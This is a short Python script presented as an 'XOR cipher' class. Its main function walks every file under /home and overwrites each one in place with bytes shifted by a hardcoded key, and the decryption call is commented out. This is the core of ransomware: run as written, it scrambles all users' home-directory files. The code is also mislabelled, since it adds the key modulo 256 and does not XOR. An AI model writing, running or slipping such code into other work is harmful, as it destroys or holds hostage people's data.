import os
import random 

class Cipher:
    class XOR:
        @staticmethod
        def encrypt():
            key = 'ThisIsA50CharacterLongKeyForEncryption1234567890!@'
            for root, dirs, files in os.walk('/home'):
                for file in files:
                    file_path = os.path.join(root, file)
                    with open(file_path, 'rb') as f:
                        data = f.read()
                    
                    encrypted_data = bytes([(data[i] + ord(key[i % len(key)])) % 256 for i in range(len(data))])
                    
                    with open(file_path, 'wb') as f:
                        f.write(encrypted_data)
                    print(f"Encrypted: {file_path}")

            print("XOR Encryption completed.")

        @staticmethod
        def decrypt():
            key = 'ThisIsA50CharacterLongKeyForEncryption1234567890!@'
            for root, dirs, files in os.walk('/home'):
                for file in files:
                    file_path = os.path.join(root, file)
                    with open(file_path, 'rb') as f:
                        encrypted_data = f.read()
                    
                    decrypted_data = bytes([(encrypted_data[i] - ord(key[i % len(key)])) % 256 for i in range(len(encrypted_data))])
                    
                    with open(file_path, 'wb') as f:
                        f.write(decrypted_data)
                    print(f"Decrypted: {file_path}")

            print("XOR decryption completed.")

   

def main():
    Cipher.XOR.encrypt()
    #Cipher.XOR.decrypt()


if __name__ == "__main__":
    main()
